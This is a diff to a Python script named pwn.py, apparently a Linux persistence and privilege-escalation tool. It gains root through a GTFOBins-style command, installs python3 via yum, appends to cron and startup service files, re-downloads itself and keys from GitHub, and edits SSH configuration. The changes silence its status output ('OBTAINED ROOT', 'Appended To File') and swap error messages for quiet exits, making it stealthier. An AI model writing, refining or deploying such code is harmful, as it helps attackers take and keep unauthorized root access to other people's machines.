@@ -1,4 +1,5 @@
 import os
+import sys
 import subprocess
 import time
 
@@ -101,17 +102,20 @@ def update_python():
         runCommand(pyth)
         return
     except Exception:
-        print('updating python')
+        #print('updating python')
         runCommand(gtfoBin.format('yum -y -q -e 0 install python3 > /dev/null'))
 
-def rerun():
-    runCommand(gtfoBin.format('/usr/bin/python3 pwn.py'), True)
+def rerun(updated=False):
+    if updated:
+        runCommand("/usr/bin/python3 pwn.py 1")
+    else:
+        runCommand(gtfoBin.format('/usr/bin/python3 pwn.py'), True)
     exit()
 
 
 def is_root():
     if os.getuid() == 0:
-        print("OBTAINED ROOT")
+        #print("OBTAINED ROOT")
         return True
     else:
         # Rerun This Script As Root User
@@ -137,7 +141,8 @@ def startUpRecovery():
                 service.writelines(line)
             
     except:
-        print("Failed To Append to File ", path)    
+        #print("Failed To Append to File ", path)
+        exit()
 
 
 def appendCron(path, command):
@@ -166,10 +171,10 @@ def appendCron(path, command):
                 cron.close()
             runCommand("systemctl reload crond.service")
             runCommand("systemctl restart crond.service")
-            print('Appended To File ', path)
+            #print('Appended To File ', path)
 
     except:
-        print('bruh')
+        exit()
 
     
 
@@ -218,6 +223,7 @@ def getScript():
             open(locationDir + file, "wb").write(save.content)
 
         print("redownloaded script from github")
+        rerun()
     else:
         exit()
 
@@ -230,7 +236,8 @@ def main():
     if not is_root(): exit()
 
     # Update The Script From GitHub And Obtain Keys To Add
-    getScript()
+    if len(sys.argv) == 1:
+        getScript()
 
     # attempt to edit ssh files
     sshConfigEdit()
